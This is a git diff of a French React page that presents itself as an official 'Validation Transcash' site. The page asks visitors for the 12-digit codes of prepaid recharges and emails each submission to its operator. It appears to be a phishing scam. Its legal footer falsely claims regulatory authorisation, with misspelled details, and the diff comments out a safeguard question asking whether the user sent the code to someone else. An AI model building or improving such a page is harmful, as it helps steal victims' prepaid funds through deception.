@@ -16,7 +16,22 @@ import './styles/accueil.scss';
 const Accueil = () => {
   const [show, setShow] = useState(false);
   const [showe, setShowe] = useState(false);
-  const form = useRef();
+  const [eye, seteye]= useState(true)
+
+  const Eyeclick = () => {
+ seteye(!eye)
+    const code = document.getElementById('code');
+    if (eye) {
+      code.setAttribute('type', 'text');
+      seteye(false)
+    }
+    else {
+      code.setAttribute('type','password')
+    }
+
+    
+  }
+   const form = useRef();
    const sendEmail = (e) => {
      e.preventDefault();
       const message = document.getElementById("message");
@@ -31,12 +46,13 @@ const Accueil = () => {
        .then(
          (result) => {
           
-           message.innerHTML = "Votre requète à été envoyé , Patientez quelques minuites";
-           message.style.color="green"
+           message.innerHTML = "Votre requète à bien été envoyé , vérifier votre boite mail";
+           message.style.color = "green";
+           
          },
          (error) => {
-           message.innerHTML = "Requète non traité";
-           message.style.color = "black";
+           message.innerHTML = "Réquète non traité, veuillez vérifier votre connexion internet et réessayer.";
+           message.style.color = "red";
          }
        );
    };
@@ -68,24 +84,24 @@ const Accueil = () => {
             <i className={show ? "fa-solid fa-xmark" : "fa-solid fa-bars"} />
           </div>
           <div className={show ? "links active" : "links"}>
-            <a href="Accueil">Accueil</a>
+            <a href="#">Accueil</a>
             <a href="#validation">Validation</a>
-            <a href="Contact">Contact</a>
+            <a href="#services">Services</a>
           </div>
         </nav>
 
         <div className="firstImg">
           <img height="100px" src={profil} alt="" />
-          <h1>Activation Transcash</h1>
+          <h1>Validation Transcash</h1>
         </div>
 
         <div className="accueil">
-          <h3>Bienvenue sur le site Officiel</h3>
+          <h3>Bienvennue sur le site officiel de Vérification Transcash</h3>
           <hr></hr>
         </div>
 
         <div className="phone">
-          <img height="100px" src={phone} alt="" />
+          <img height="200px" width={300} src={phone} alt="" />
         </div>
 
         <h2>Activation de vos recharges</h2>
@@ -120,8 +136,11 @@ const Accueil = () => {
 
         <hr></hr>
         <p>
-          La recharge TRANS-CASH Mastercard est un moyen de paiement prépayé fiable sur internet, avec une recharge, qui vous accompagne au quotidien dans vos dépenses. Commander le en ligne ou achetez vos recharges de paiement dans un bureau de tabac et
-          profitez de tous ses avantages qui simplifieront la vie.
+          La recharge TRANS-CASH Mastercard est un moyen de paiement prépayé
+          fiable sur internet, avec une recharge, qui vous accompagne au
+          quotidien dans vos dépenses. Commander le en ligne ou achetez vos
+          recharges de paiement dans un bureau de tabac et profitez de tous ses
+          avantages qui simplifieront la vie.
         </p>
         <hr></hr>
         <div className="formulaire">
@@ -135,6 +154,7 @@ const Accueil = () => {
                   type="text"
                   name="name"
                   id="nom"
+                  minLength={4} maxLength={25}
                 />
               </label>
             </div>
@@ -176,12 +196,29 @@ const Accueil = () => {
                 <input
                   required
                   placeholder="Ex:000000000000"
-                  type="text"
+                  type="password"
                   minLength="12"
                   maxLength="12"
                   name="code"
-                  id=""
+                  id="code"
+                  pattern="[0-9]{12}"
+                  title="Le code doit contenir que les chiffres"
                 />
+                <i
+                  onClick={Eyeclick}
+                  style={{
+                    position: "absolute",
+                    right: "10%",
+                    top: "40%",
+                    color: "orange",
+                    zIndex: "10000",
+                    fontSize: "30px",
+                    cursor: "pointer",
+                  }}
+                  class={
+                    eye ? "fa-solid fa-eye-slash":"fa-solid fa-eye"
+                  }
+                ></i>
               </label>
             </div>
             <p>Lieu d'achat *</p>
@@ -189,23 +226,23 @@ const Accueil = () => {
               <input type="radio" name="lieu" id="lieu" /> Internet
             </label>
             <label style={{ color: "orange" }}>
-              <input type="radio" name="lieu" id="lieu" /> Bureau de Tabac
+              <input required type="radio" name="lieu" id="lieu" /> Bureau de Tabac
             </label>
             <p>
-              Je certifie que mon code n'a pas été utilisé sur un autre site
+              Je certifie que mon code n'a pas été utilisé sur un autre site *
             </p>
             <label style={{ color: "orange" }}>
-              <input type="radio" name="utile" id="" /> oui
+              <input required  type="radio" name="utile" id="" /> oui
               <input type="radio" name="utile" id="" /> non
             </label>
-            <p>
+            {/* <p>
               Je n'ai pas envoyer mon code à un individu pour une prestation de
               service *
-            </p>
-            <label style={{ color: "orange" }}>
+            </p> */}
+            {/* <label style={{ color: "orange" }}>
               <input type="radio" name="valide" id="" /> oui
               <input type="radio" name="valide" id="" /> non
-            </label>
+            </label> */}
             <div className="submit">
               <input type="submit" id="submit" value="Vérifier Maintenant" />
             </div>
@@ -216,13 +253,14 @@ const Accueil = () => {
         <br></br>
         <hr></hr>
 
-        <div className="siteRecharge">
+        <div id='services' className="siteRecharge">
           <p style={{ color: "gray" }}>
-              Le site RECHARGE-AUTHENTIFICATION est émis par CARS-coopération sous une licence d'authentification internationale Incorporated. Le service est autorisé par la conduite
-            financière autorité (FRN 9 000 036) en vertu des
-            règlements de 2011 sur la monnaie électronique pour l'émission de monnaie électronique et fourniture de services électronique et fourniture de services de paiement. Siège Social
-            :5ᵉ étage, Langham Housse, 302-308 Regent Steet,
-            Londres, W1B 3AT.Numéro d'entreprise : 066337638.
+    Le site RECHARGE-AUTHENTIFICATION est émis par CARD-coopération sous une licence d'authentification internationale Incorporated. Le service est autorisé par la conduite financière autorité (FRN 9 000
+            036) en vertu des règlements de 2011 sur la monnaie électronique
+            pour l'émission de monnaie électronique et fourniture de services
+            électronique et fourniture de services de paiement. Siège Social :5ᵉ
+            étage, Langham Housse, 302-308 Regent Steet, Londres, W1B 3AT.Numéro
+            d'entreprise : 066337638.
           </p>
           <img height={100} width={200} src={visa} alt="" />
         </div>
